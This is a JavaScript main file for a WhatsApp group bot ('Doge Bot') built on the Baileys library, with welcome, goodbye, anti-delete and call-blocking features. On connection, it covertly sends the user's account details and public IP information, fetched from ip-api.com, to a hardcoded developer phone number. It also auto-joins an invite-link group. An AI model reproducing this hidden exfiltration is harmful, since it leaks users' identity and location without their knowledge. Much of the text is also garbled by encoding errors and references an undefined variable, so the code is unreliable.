// C檀虂虈虙蛽虡蛽蛶r痰虛蛡蛺蛢虡毯虡蜄蛵太虣滩汰虡e谈蛯虌虘虅蜐坛贪态苔蛧胎蛵太贪a潭蜐态贪虪胎抬坦蜌虦t谈虒蜅蜄抬虪太坛虩蜁蜌e檀虃虉虓蛯蛡蜐虊虊蜎蜐贪蛿蛥泰蛵踏d谭虉蛡蛣虙蜎蜆蜆蛝虇虒蛨胎蛧 痰處蜐蜖蜎探蛻虤虆虉虇苔蜄虪蛵號滩态b谈虂虃蜐蛫虅袒蛥蛪蛶坍台汰y檀蜐虒虄蛣虄虂蛻探虙台蛥汰 谭蜆虓虜虧挞坍汰蛶蜄汰X谈虆蜅叹虌虛虁虝虛蹋挞酞號蜄抬蜋抬e痰蛦虖蛻胎坛摊酞虧袒酞o谈蛢蜅虁探蛬蛺虤虈虛虈蛽踏蛶泰n痰虉虤蛠蛶贪蛵贪 
const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  Mimetype,
  GroupSettingChange,
} = require("@adiwajshing/baileys");
const simple = require("./lib/simple.js");
const WAConnection = simple.WAConnection(_WAConnection);
const figlet = require('figlet')
const fs = require("fs");
const { version, bugs } = require('./package.json')
const { banner, start, success, getGroupAdmins } = require("./lib/functions");
const fetch = require("node-fetch");
const moment = require("moment-timezone");
blocked = [];
const { color } = require('./lib/color')
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Good night";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Good evening馃尀";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "good afternoon馃寗";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "good afternoon鈽�锔�";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Good morning馃寘";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Good night馃寖";
    }
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " Day, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " Hour, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " Minute, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " second" : " Second") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
fakenomor = '0@s.whatsapp.net'
const gcrevoke = ["918591220868-8591220868@g.us"]
prefix = '#'
shp = '猬�'
owner = "918591220868@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
require("./index.js");
nocache("./index.js", (module) => console.log(`${module} is now updated!`));
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const starts = async (client = new WAConnection()) => {
  client.logger.level = "warn";
  client.version = [2, 2143, 3];
  client.browserDescription = ["Subscribe WHOIAM", "Chrome", "3.0"];
  console.log(banner.string);
  client.on("qr", () => {
    console.log(
      color("[", "white"),
      color("!", "blue"),
      color("]", "white"),
      color(" flashy scan the qr code"),
      client.sendMessage(`918591220868@s.whatsapp.net`, `銆� *NOTIFICATION!* 銆峔n\n _Bot Connected Successfully!_`, MessageType.extendedText)
          
    );
  });

  fs.existsSync("./session.json") && client.loadAuthInfo("./session.json");
  client.on("connecting", () => {
    start("2", "Connecting...");
  });
  client.on("open", () => {
    success("2", "Successfully connected to WHOIAM, Subscribe WHOIAM");
console.log(color(figlet.textSync(`${spc1}            Doge Bot`, {
font: 'Standard',
horizontalLayout: 'default',
vertivalLayout: 'default',
width: 80,
whitespaceBreak: false
}), 'cyan'))
console.log(color(`${spc2}[ 鈥� CREATOR BOT ${fakeyoi} 鈥� ]` ,'cyan'))
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
console.log(color(`${spc3}[鈥`, 'aqua'), color(`Hi        : ${ucapanWaktu}`, 'white'))
console.log(color(`${spc3}[鈥`, 'aqua'), color(`Bot Version : 2.1.2`, 'white'))
console.log(color(`${spc3}[鈥`, 'aqua'), color(`Status      : Online!`, 'white'))
console.log(color(`${spc3}[鈥`, 'aqua'), color(`Owner       : ${fakeyoi}`, 'white'))
console.log(color(`${spc4}< ================================================== >`, 'cyan'))

    console.log(color('鈳�','red'), color('饾檮 饾櫖饾櫑饾櫎饾櫓饾櫄 饾櫓饾櫇饾櫈饾櫒 饾櫒饾櫂饾櫑饾櫈饾櫏饾櫓 饾櫌饾櫘饾櫒饾櫄饾櫋饾櫅!\n饾檳饾櫎饾櫓饾櫄: 饾樋饾櫎饾櫍饾櫓 饾櫅饾櫎饾櫑饾櫆饾櫄饾櫓 饾櫓饾櫎 饾櫒饾櫔饾櫁饾櫒饾櫂饾櫑饾櫈饾櫁饾櫄 饾檽饾櫄饾櫎饾櫍', 'yellow'))
    console.log(color('鈳�','red'), color('饾棪饾椉饾槀饾椏饾棸饾棽 饾棖饾椉饾棻饾棽 饾棭饾棽饾椏饾榾饾椂饾椉饾椈:', 'aqua'), color(version))
    console.log(color('鈳�','red'), color('饾棔饾槀饾棿? 饾棙饾椏饾椏饾椉饾椏? 饾棪饾槀饾棿饾棿饾棽饾榾饾榿饾椂饾椉饾椈? 饾棭饾椂饾榾饾椂饾榿 饾棝饾棽饾椏饾棽:', 'aqua'), color('https://wa.me/918591220868'))
    console.log(color('[DOGE BOT]'), color('饾悆饾惃饾悹饾悶 饾悂饾惃饾惌 饾棞饾榾 饾棦饾椈饾椆饾椂饾椈饾棽 銒涳笌', 'aqua'))
    console.log(color('[DEV]', 'cyan'), color('饾棯饾棽饾椆饾棸饾椉饾椇饾棽 饾棔饾棶饾棸饾椄, 饾棦饾槃饾椈饾棽饾椏! 饾棝饾椉饾椊饾棽 饾棳饾椉饾槀 饾棓饾椏饾棽 饾棗饾椉饾椂饾椈饾棿 饾棯饾棽饾椆饾椆~', 'magenta'))
    console.log(color('鈳�','green'), color('饾檹饾櫇饾櫀饾櫍饾櫊饾櫒 饾櫅饾櫎饾櫑 饾櫔饾櫒饾櫈饾櫍饾櫆 饾櫓饾櫇饾櫄 饾櫁饾櫎饾櫓', 'white'))
  });
await client.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./session.json",JSON.stringify(client.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/G3a3AQndqS5J45eD7zznXF`
 client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
 client.sendMessage(`918591220868@s.whatsapp.net`, `*Hi Owner WHOIAM, the bot has been successfully connected to this number*\n鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer WHOIAM Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./WHOIAM.jpg'),sourceUrl:"https://wa.me/918591220868?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("918591220868@s.whatsapp.net", `鈹�鈹�鈹�鈹�鈹�銆� *IP-USER* 銆嶁攢鈹�鈹�鈹�鈹�\n\n\`\`\`${bu}\`\`\`\n鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer WHOIAM Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/918591220868?text=Hello bro"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
   })
      
    client.on('connecting', () => {
		console.log(color('|TRM|'), color('Connecting...', 'cyan'))
		})
	
	client.on('open', () => {
	console.log(color('|TRM|'), color('Connected', 'cyan'))
	}) 
     
    client.on('ws-close', () => {
        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))
        })
    
    client.on('close', async () => {
        console.log(color('|TRM|'), color('Disconnected.', 'cyan'))
        })
    
client.on('group-update', async (anu) => {
fkontakk = { key: {
  fromMe: false,
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '918591220868-8591220868@g.us' } : {})
},
 message: {
    "contactMessage":{"displayName":'WHOIAM',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;WHOIAM;;;\nFN:resku\nitem1.TEL;waid=918591220868:+91 690-9137-213\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
metdata = await client.groupMetadata(anu.jid)
if(anu.announce == 'false'){
teks = ` [ Group Opened ] \n\n_Group has been opened by admin_\n_Now all members can send messages_`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Opened ] - In ${metdata.subject}`)
}
else if(anu.announce == 'true'){
teks = ` [ Group Closed ] \n\n_Group has been closed by admin_\n_Now only admin can send messages_`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(` [ Group Closed ]  In ${metdata.subject}`)
}
else if(!anu.desc == ''){
tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
teks = ` [ Group Description Change ] \n\nGroup description has been changed by Admin @${anu.descOwner.split('@')[0]}\n鈥� New Description : ${anu.desc}`
client.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
console.log(`- [ Group Description Change ] - In ${metdata.subject}`)
  }
else if(anu.restrict == 'false'){
teks = `- [ 饾棜饾椏饾椉饾槀饾椊 饾棪饾棽饾榿饾榿饾椂饾椈饾棿 饾棖??饾棶饾椈饾棿饾棽 ] -\n\nEdit Group info has been opened for members\nNow all members can edit this group info`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
  }
else if(anu.restrict == 'true'){
teks = `- [ 饾棜饾椏饾椉饾槀饾椊 饾棪饾棽饾榿饾榿饾椂饾椈饾棿 饾棖饾椀饾棶饾椈饾棿饾棽 ] -\n\nEdit Group info has been closed for members\nNow only group admins can edit this group info`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
}
})
  client.on("group-participants-update", async (anu) => {
    try {
      groupMet = await client.groupMetadata(anu.jid);
      groupMembers = groupMet.participants;
      groupAdmins = getGroupAdmins(groupMembers);
      mem = anu.participants[0];

      console.log(anu);
      try {
        pp_user = await client.getProfilePicture(mem);
      } catch (e) {
        pp_user =
          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
      }
      try {
        pp_grup = await client.getProfilePicture(anu.jid);
      } catch (e) {
        pp_grup =
          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
      }
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        client.sendMessage(anu.jid, "Hello everyone, am Doge Bot, ready to help you here 銒涳笌", "conversation");
      }
hehe = await getBuffer(pp_user)
if (anu.action == 'add' && !mem.includes(client.user.jid)) {
             const mdata = await client.groupMetadata(anu.jid)
             
             const memeg = mdata.participants.length
             const thu = await client.getStatus(anu.participants[0], MessageType.text)
             const num = anu.participants[0]
             const bosco1 = await client.prepareMessage("0@s.whatsapp.net", hehe, MessageType.location,{ thumbnail: hehe})
			 const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
                let v = client.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = v.vname || v.notify || num.split('@')[0]
                time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
                time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
                teks = `馃尶 *H瑟* @${num.split('@')[0]}\n馃尶 *B瑟岽�* : *${thu.status}*\n馃尶 *M岽囜磵蕶岽囀�s : ${memeg}*\n馃尶 *W岽囀熱磩岽忈磵岽� T岽�* \n *${mdata.subject}*\n馃尶 *岽呩磸纱岽� 隃搬磸蕗散岽囜礇 岽涐磸 蕗岽囜磤岽� 岽呩磭隃贬磩蕗瑟岽樶礇瑟岽徤�*\n 饾悆饾惃饾悹饾悶 饾悂饾惃饾惌`
                welcomeBut = [{buttonId:`getdeskgc`,buttonText:{displayText:'DESCRIPTION'},type:1}, {buttonId:`okeyx`,buttonText:{displayText:'CLICK HERE'},type:1}]
                welcomeButt = { contentText: `聽`, footerText: `${teks}`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
                client.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
                 }
            if (anu.action == 'remove' && !mem.includes(client.user.jid)) {
                const mdata = await client.groupMetadata(anu.jid)
                const num = anu.participants[0]
                const bosco3 = await client.prepareMessage("0@s.whatsapp.net", hehe, MessageType.location,{ thumbnail: hehe})
			    const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
                let w = client.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = w.vname || w.notify || num.split('@')[0]
                time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
                time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
                memeg = mdata.participants.length
                out = `*G岽忈磸岽� B蕪岽�* 馃憢\n@${num.split('@')[0]}\n*饾櫡饾殬饾殭饾殠饾殢饾殲饾殨饾殨饾殺 饾殐饾殤饾殠饾殯饾殠 饾殕饾殬饾殫饾殱 饾櫛饾殠 饾櫛饾殲饾殯饾殟饾殠饾殫 饾櫡饾殠饾殯饾殠 饾櫚饾殫饾殺饾殩饾殬饾殯饾殠* 馃尶\n饾悆饾惃饾悹饾悶 饾悂饾惃饾惌`
                goodbyeBut = [{buttonId:`h`,buttonText:{displayText:'GET OUT 馃毆'},type:1}, {buttonId:`sc`,buttonText:{displayText:'BOT SCRIPT'}, type:1}]
                goodbyeButt = { contentText: ` `, footerText: `${out}`, buttons: goodbyeBut, headerType: 6, locationMessage: bosco3.message.locationMessage}
                client.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
            }
      /*welcom = true
      if (anu.action == "add" && !mem.includes(client.user.jid)) {
        mdata = await client.groupMetadata(anu.jid);
        memeg = mdata.participants.length;
        num = anu.participants[0];
        if (welcom === false) return
        let v = client.contacts[num] || { notify: num.replace(/@.+/, "") };
        anu_user = v.vname || v.notify || num.split("@")[0];
        time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
        teks = `饾棝饾棶饾椆饾椉 ${anu_user} 饾棪饾棽饾椆饾棶饾椇饾棶饾榿 饾棗饾棶饾榿饾棶饾椈饾棿 銈凤笌`;
        buff = await getBuffer(
          `http://hadi-api.herokuapp.com/api/card/welcome?nama=${anu_user}&descriminator=${
            groupMembers.length
          }&memcount=${memeg}&gcname=${encodeURI(
            mdata.subject
          )}&pp=${pp_user}&bg=https://i.postimg.cc/rFkw8MpX/IMG-20210807-151325.jpg`
        );
        buttons = [
          { buttonId: `verify`, buttonText: { displayText: "饾懡饾拞饾挀饾拪饾拠饾挌銒涳笌" }, type: 1 },
          { buttonId: `command`, buttonText: { displayText: "饾應饾拲饾拪饾拕饾拰 饾懘饾拞饾拸饾挅銒涳笌" }, type: 1 },
        ];
        imageMsg = (
          await client.prepareMessageMedia(buff, "imageMessage", {
            thumbnail: buff,
          })
        ).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: `銒� 饾槞饾樁饾槸饾樀饾槳饾槷饾槮 ${runtime(process.uptime())} \n 饾槉饾槼饾槮饾槩饾樀饾槮饾槬 饾槈饾樅 ${fakeyoi}`,
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await client.prepareMessageFromContent(
          mdata.id,
          { buttonsMessage },
          {}
        );
        client.relayWAMessage(prep);
      }
      if (anu.action == "remove" && !mem.includes(client.user.jid)) {
        mdata = await client.groupMetadata(anu.jid);
        num = anu.participants[0];
        let w = client.contacts[num] || { notify: num.replace(/@.+/, "") };
        anu_user = w.vname || w.notify || num.split("@")[0];
        time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
        memeg = mdata.participants.length;
        out = `饾棪饾棶饾槅饾椉饾椈饾棶饾椏饾棶 ${anu_user} 馃憢`;
        buff = await getBuffer(
          `http://hadi-api.herokuapp.com/api/card/goodbye?nama=${anu_user}&descriminator=${
            groupMembers.length
          }&memcount=${memeg}&gcname=${encodeURI(
            mdata.subject
          )}&pp=${pp_user}&bg=https://i.postimg.cc/rFkw8MpX/IMG-20210807-151325.jpg`
        );
        buttons = [
          { buttonId: `y`, buttonText: { displayText: "饾槈饾樅饾槮饾槮銈凤笌" }, type: 1 },
          { buttonId: `runtime`, buttonText: { displayText: "饾槞饾樁饾槸饾樀饾槳饾槷饾槮銈凤笌" }, type: 1 },
        ];
        imageMsg = (
          await client.prepareMessageMedia(buff, "imageMessage", {
            thumbnail: buff,
          })
        ).imageMessage;
        buttonsMessage = {
          contentText: `${out}`,
          footerText: `銒涳笌 饾槞饾樁饾槸饾樀饾槳饾槷饾槮 ${runtime(process.uptime())} \n 饾槉饾槼饾槮饾槩饾樀饾槮饾槬 饾槈饾樅 ${fakeyoi}馃尮`,
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await client.prepareMessageFromContent(
          mdata.id,
          { buttonsMessage },
          {}
        );
        client.relayWAMessage(prep);
      }*/
      
      if (anu.action == "promote") {
        const mdata = await client.groupMetadata(anu.jid);
        num = anu.participants[0];
        let w = client.contacts[num] || { notify: num.replace(/@.+/, "") };
        anu_user = w.vname || w.notify || num.split("@")[0];
        try {
          ppimg = await client.getProfilePicture(
            `${anu.participants[0].split("@")[0]}@c.us`
          );
        } catch {
          ppimg =
            "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg";
        }
        let buffer = await getBuffer(
          `https://api-yogipw.herokuapp.com/api/promote?name=${anu_user}&msg=promoted%20as%20admin&mem=${groupAdmins.length}&picurl=${ppimg}&bgurl=https://cdn.discordapp.com/attachments/819995259261288475/835055559941292032/style.jpg`
        );
        teks = `${anu_user} has been promoted as admin`;
        client.sendMessage(mdata.id, buffer, MessageType.image, {
          caption: teks,
        });
      }

      if (anu.action == "demote") {
        const mdata = await client.groupMetadata(anu.jid);
        num = anu.participants[0];
        let w = client.contacts[num] || { notify: num.replace(/@.+/, "") };
        anu_user = w.vname || w.notify || num.split("@")[0];
        try {
          ppimg = await client.getProfilePicture(
            `${anu.participants[0].split("@")[0]}@c.us`
          );
        } catch {
          ppimg =
            "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg";
        }

        let buffer = await getBuffer(
          `https://api-yogipw.herokuapp.com/api/demote?name=${anu_user}&msg=yahahaha demoted&mem=${groupAdmins.length}&picurl=${ppimg}&bgurl=https://cdn.discordapp.com/attachments/819995259261288475/835055559941292032/style.jpg`
        );
        teks = `${anu_user} has been demoted from admin`;
        client.sendMessage(mdata.id, buffer, MessageType.image, {
          caption: teks,
        });
      }
    } catch (e) {
      console.log("Error : %s", color(e, "red"));
    }
  });
  //
 antidel = false
  client.on("message-delete", async (m) => {
    if (m.key.remoteJid == "status@broadcast") return;
    if (!m.key.fromMe && m.key.fromMe) return;
   if (antidel === false) return
    m.message =
      Object.keys(m.message)[0] === "ephemeralMessage"
        ? m.message.ephemeralMessage.message
        : m.message;
    const jam = moment.tz("Asia/Jakarta").format("HH:mm:ss");
    let d = new Date();
    let locale = "id";
    let gmt = new Date(0).getTime() - new Date("1 Januari 2021").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
     ];
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let calender = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
     const type = Object.keys(m.message)[0];
     client.sendMessage(
      m.key.remoteJid,
      `\`\`\`銆� 饾棓饾棥饾棫饾棞 饾棗饾棙饾棢饾棙饾棫饾棙 銆峔`\`\`
  鈥�> Name : @${m.participant.split("@")[0]}
  鈥�> Type : ${type}`,
      MessageType.text,
      { quoted: m.message, contextInfo: { mentionedJid: [m.participant] } }
    );

    client.copyNForward(m.key.remoteJid, m.message);
  });
  client.on("chat-update", async (message) => {
    require("./index.js")(client, message);
  });
  isBattre = "Not Detect"; //
  isCharge = "Not Detect"; //
  client.on(`CB:action,,battery`, (json) => {
    const batteryLevelStr = json[2][0][1].value;
    const batterylevel = parseInt(batteryLevelStr);
    isBattre = batterylevel + "%";
    isCharge = json[2][0][1].live;
  });
antical = true
client.on("CB:Call", json => {
if (antical === false) return
let call;
calling = JSON.parse(JSON.stringify(json))
call = calling[1].from
client.sendMessage(call, `*Sorry ${client.user.name} can't receive calls.*\n*Call = Block!*`, MessageType.text)
.then(() => client.blockUser(call, "add"))
})
  client.on("CB:Blocklist", (json) => {
    if (blocked.length > 2) return;
    for (let i of json[1].blocklist) {
      blocked.push(i.replace("c.us", "s.whatsapp.net"));
    }
  });
};

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional>
 */
function nocache(module, cb = () => {}) {
  console.log("Module", `'${module}'`, "is now being watched for changes");
  fs.watchFile(require.resolve(module), async () => {
    await uncache(require.resolve(module));
    cb(module);
  });
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = ".") {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(module)];
      resolve();
    } catch (e) {
      reject(e);
    }
  });
}

starts();
// Dont delete the credit wrote on top :V
